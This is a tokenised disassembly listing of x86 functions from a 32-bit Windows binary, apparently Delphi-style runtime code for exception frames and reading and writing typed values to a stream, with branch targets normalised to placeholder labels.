mov [ fs : eax ] edx
push sub_42aa70
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
jmp [ eax * 4 + jump_table_42a8fb ]
push ebp
call sub_42a810
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42a4fc
jmp r-xdata
push ebp
mov eax 0x1
call sub_42a838
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7c8
jmp r-xdata
push ebp
mov eax 0x1
call sub_42a838
pop ecx
jmp r-xdata
push ebp
call sub_42a868
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
push ebp
mov eax 0x2
call sub_42a838
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42acd0
jmp r-xdata
push ebp
mov eax 0x1
call sub_42a838
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_42acd0
sub_42aa74
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42aab1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_42a4fc
mov eax ebx
call sub_42a8c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aab8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42aabc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_42ab54
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_428668
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x28 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_42a4fc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_42a4fc
jmp r-xdata
mov eax ebx
call sub_42aa74
mov eax ebx
call sub_4297cc
jmp r-xdata
mov eax ebx
call sub_428668
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_42aabc
mov eax ebx
call sub_4297cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ab5b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_44936c
retn
sub_42ab64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ac09
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449d80
xor eax eax
mov [ ebp - 0x8 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42e7b0
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac10
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ ebx + 0x5a ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_42ac34
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x4c ]
call [ edi + 0x48 ]
sub_42ac5c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_428980
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_423b98
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_448428
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_428980
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_42acd0
push ebx
push esi
add esp 0xfffffe00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x200
pop esi
pop ebx
retn
cmp ebx 0x200
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_428a50
xor ebx ebx
mov edx esp
mov ecx 0x200
mov eax esi
call sub_428a50
sub ebx 0x200
jmp r-xdata
test ebx ebx
jg r-xdata
sub_42ad18
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42aec1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_428520
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42ae9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_428a50
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_4272f8
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x18 ]
call sub_428a50
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d50
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42ae77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_42a58c
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_428a50
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_4272f8
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_428a50
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_445408
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
lea eax [ ebp - 0x8 ]
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_43c01c
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ae7e
mov eax [ ebp - 0x14 ]
call sub_4481b0
retn
sub_42aee0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b0f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43ef08
mov eax [ ebp - 0x4 ]
call sub_428a2c
and eax 0x7f
cmp eax 0x15
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
jmp [ eax * 4 + jump_table_42af22 ]
mov eax [ ebp - 0x4 ]
call sub_42a7b4
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_429714
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_443db8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429714
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_443db8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429714
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_443db8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429428
mov eax ebx
call sub_443fdc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4294a4
mov eax ebx
call sub_443fdc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429460
mov eax ebx
call sub_443fdc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4294e8
mov eax ebx
call sub_444004
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429538
mov eax ebx
call sub_443ff0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42a58c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_44407c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42a674
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_444044
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a7b4
cmp al 0x9
sete dl
mov eax ebx
call sub_443fb4
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_42ad18
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f250
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_429780
push edx
push eax
mov eax ebx
call sub_443ee0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b0f9
lea eax [ ebp - 0x1c ]
call sub_43ef1c
lea eax [ ebp - 0xc ]
call sub_4499d8
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
mov eax ebx
call sub_4454dc
jmp r-xdata
sub_42b100
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax esi
call sub_42b314
mov edx ebx
and dl 0xfc
mov eax esi
call sub_427d98
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_42b138
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42d334
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_42b160
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_42d334
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_42b28c
sub_42b19c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
mov eax esi
xor edx edx
call sub_449d2c
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov eax [ ebx + 0x1c ]
mov eax [ eax ]
mov edx [ esp ]
call sub_4485b4
sub_42b1ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_427274
cmp eax esi
jg r-xdata
mov eax ebx
call sub_42b314
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_427294
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_42b240
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_42b314
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_42b28c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b303
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_42d794
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_42b240
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_42b240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b30a
mov eax [ ebp - 0x4 ]
call sub_4481b0
retn
sub_42b340
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b383
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449e98
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42d580
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b38a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42b390
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42b3d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_449e98
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42d78c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b3da
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_42b3e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_42b472
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_42d794
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42bc54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b479
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4254d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_42bc4c
mov edx esi
mov eax edi
call sub_4254e0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42bca4
mov eax [ ebp - 0x4 ]
call sub_42bc54
inc esi
dec ebx
jne r-xdata
sub_42b480
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4246e8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43501c
test al al
jne r-xdata
sub_42b4d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42b617
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_42e8d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_42b480
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42e8a4
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_42e8d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42e8a4
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b61e
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42e8a4
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42e8a4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_42b624
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b9be
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_448088
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0xc ]
mov ebx [ ebp - 0x4 ]
sub ecx [ ebx + 0x10 ]
lea edx [ edx + eax + 0x9 ]
cmp ecx edx
jge r-xdata
sub edx 0x4
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_42b18c
mov [ ebp - 0xc ] eax
movzx eax [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b314
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
movzx edx [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_42bc5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_448088
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_42d6b8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov ebx eax
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_448350
push [ ebp - 0x38 ]
push r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_448088
push [ ebp - 0x3c ]
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_44a1b8
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_42d6b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42bca4
mov eax [ ebp - 0x4 ]
call sub_42bc54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_42b958
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42d6b8
mov eax [ ebp - 0x4 ]
call sub_42b18c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4246e8
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b95f
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_42b916
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_42b4d0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4481b0
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_42b12c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_4483f8
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_42b95f
mov eax [ ebp - 0x4 ]
call sub_42bc54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b9c5
lea eax [ ebp - 0x40 ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x2c ]
call j_sub_449348
retn
movzx eax [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b18c
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42b1ec
sub_42b9e4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_42d388
mov edx esi
mov eax ebx
call sub_42b4d0
pop esi
pop ebx
retn
sub_42ba0c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_42d794
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_42b240
pop ebx
pop ebp
retn 0xc
sub_42ba30
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_42d794
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_42b240
pop ebx
pop ebp
retn 0x4
sub_42ba54
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_42d794
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_42b240
pop ebx
pop ebp
retn 0x8
sub_42ba78
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_42d794
lea edx [ ebp + 0x8 ]
mov ecx 0x8
